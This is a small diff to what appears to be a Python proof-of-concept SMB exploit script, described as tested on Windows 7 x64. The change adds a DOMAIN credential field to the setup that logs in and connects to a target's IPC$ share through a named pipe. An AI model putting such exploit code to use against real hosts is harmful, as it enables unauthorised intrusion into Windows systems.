@@ -13,8 +13,9 @@ Note:
 - this PoC only test against Windows 7 x64
 '''
 
-USERNAME = ''
-PASSWORD = ''
+USERNAME = ''		#Edit username
+PASSWORD = ''		#Edit password
+DOMAIN = ''		#Edit domain
 
 if len(sys.argv) != 3:
 	print("{} <ip> <pipe_name>".format(sys.argv[0]))
@@ -25,7 +26,7 @@ pipe_name = sys.argv[2]
 
 conn = MYSMB(target)
 
-conn.login(USERNAME, PASSWORD, maxBufferSize=512)
+conn.login(USERNAME, PASSWORD, DOMAIN, maxBufferSize=512)
 
 tid = conn.tree_connect_andx('\\\\'+target+'\\'+'IPC$')
 conn.set_default_tid(tid)
